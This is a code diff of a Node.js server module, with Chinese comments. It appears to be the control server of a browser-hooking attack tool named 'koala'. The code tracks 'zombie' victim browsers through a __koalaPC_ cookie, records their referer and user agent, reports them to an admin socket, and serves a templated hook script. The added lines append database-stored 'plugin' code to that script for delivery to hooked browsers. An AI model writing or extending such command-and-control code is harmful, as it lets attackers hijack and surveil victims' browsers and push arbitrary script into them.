@@ -2,6 +2,7 @@
 var fs = require('fs');
 var path = require('path');
 var pc = require('../proxy').pc;
+var plugin = require('../proxy').plugin;
 var project = require('../proxy').project;
 var eventproxy = require('eventproxy');
 var logger = require('../common/logger');
@@ -23,14 +24,14 @@ exports.online = function(server, admin_io, zombie_io){
             var pc_socket_id = pc_id[1];
         }
         else{
-            logger.err('no cookie!');
+            logger.error('no cookie!');
             //TODO 异常处理
         }
 
         //把主机信息入库. 获取项目信息  来一个socket join 一个room
         pc.getNamesByQuery({},{},function(err,data){
             if(err){
-                logger.err(err);
+                logger.error(err);
                 return;
             }else{
                 admin_io.emit('updatePC', data);
@@ -38,11 +39,12 @@ exports.online = function(server, admin_io, zombie_io){
         });
         //ua,host,origin,user-agent,referer,cookie,
         socket.on('init',function(data){
+            //上线更新 操作 触发admin的js更新操作
 
             //异步 一部分是传输过来,一部分是socket获取.
             var ep = eventproxy();
             ep.fail('err',function(err){
-                logger.err(err);
+                logger.error(err);
                 return;
             });
             ep.all('project', 'socket_get',function(projectName, socket_data){
@@ -80,14 +82,14 @@ exports.online = function(server, admin_io, zombie_io){
                 };
                 ep.emit('socket_get', socket_data);
             }catch(e){
-                logger.err(e);
+                logger.error(e);
                 return;
             }
         });
         //处理状态更新
         socket.on('updateZombieStatus',function(data){
             //update  触发前端进行更新.
-            socket.join(data.pc_socket_id)
+            socket.join(data.pc_socket_id);
         });
         //disconet
         socket.on('disconnect',function(data){
@@ -95,11 +97,11 @@ exports.online = function(server, admin_io, zombie_io){
             try{
                 var pc_socket_id = socket.handshake.headers.cookie.match(/__koalaPC_=(.*?)(;|$)/)[1];
             }catch(e){
-                logger.err('cookie error!');
+                logger.error('cookie error!');
             }
             pc.updatePC({'socket_id':pc_socket_id},{'status':false},{},function(err,data){
                 if(err){
-                    logger.err('db error');
+                    logger.error('db error');
                     return;
                 }
             });
@@ -116,16 +118,18 @@ exports.index = function(req,res,next){
     var host = req.header('host');
     var cookie = req.cookies;
     var projectid = req.url.match(/\/(.{24})/)[1];
+    var ep = new eventproxy();
+    var pc_socket_id = Date.now();
+
     //当判断到有cookie的时候 新建一个连接 更新数据库
     //当是不同页面的时候
     if(cookie.__koalaPC_){
-        var pc_resocket_id = Date.now();
         pc.updatePC({'socket_id':cookie.__koalaPC_,'zombie_url':req.headers.referer,'zombie_ua':req.headers['user-agent']},{
-            'socket_id':pc_resocket_id,
+            'socket_id':pc_socket_id,
             'status': true
         },{},function(err){
             if(err){
-                logger.err(err);
+                logger.error(err);
                 return;
             }
             fs.readFile(path.join(__dirname, '../koala.js'),function(err,data){
@@ -135,13 +139,11 @@ exports.index = function(req,res,next){
                 var initKoala = data.toString();
                 var initData = initKoala.replace(/\{~socketiourl~\}/g,host);
                 initData = initData.replace(/\{~projectid~\}/g, projectid);
-                initData = initData.replace(/\{~socketcookie~\}/g, pc_resocket_id);
-                res.append('Set-Cookie', '__koalaPC_='+pc_resocket_id+'; Path=/;');
-                res.send(initData);
+                initData = initData.replace(/\{~socketcookie~\}/g, pc_socket_id);
+                ep.emit('succ',initData);
             });
         });
     }else{
-        var pc_socket_id = Date.now();
         fs.readFile(path.join(__dirname, '../koala.js'),function(err,data){
             if(err){
                 throw err;
@@ -149,15 +151,30 @@ exports.index = function(req,res,next){
             var initKoala = data.toString();
             var initData = initKoala.replace(/\{~socketiourl~\}/g,host);
             initData = initData.replace(/\{~projectid~\}/g, projectid);
-            res.append('Set-Cookie', '__koalaPC_='+pc_socket_id+'; Path=/;');
-            res.send(initData);
+            ep.emit('succ',initData);
         });
     }
+    ep.all('succ',function(data){
+        //加入插件数据. projectid -> pluginids -> plugincode
+        project.getNamesByQuery({'_id':projectid},{},function(err,project_info){
+            if(err){
+                next(err);
+            }
+            if(project_info[0] == undefined){
+                logger.error('无此项目');
+                return;
+            }else{
+                var plugins_list = project_info[0].plugin_id;
+            }
+            plugin.getNamesByQuery({'_id':{$in:plugins_list}},{},function(err,plugin_info){
 
-    //res.send("");
-    //res.send('');
-    //res.send('alert(1)');
+                plugin_info.forEach(function(plugin_code){
+                    data = data + plugin_code.code;
+                });
+                res.append('Set-Cookie', '__koalaPC_='+pc_socket_id+'; Path=/;');
+                res.send(data);
+            });
+        });
+    });
     //引入jquery TODO: 引入我的框架
-    //init socket.io
-    //注册事件
 };
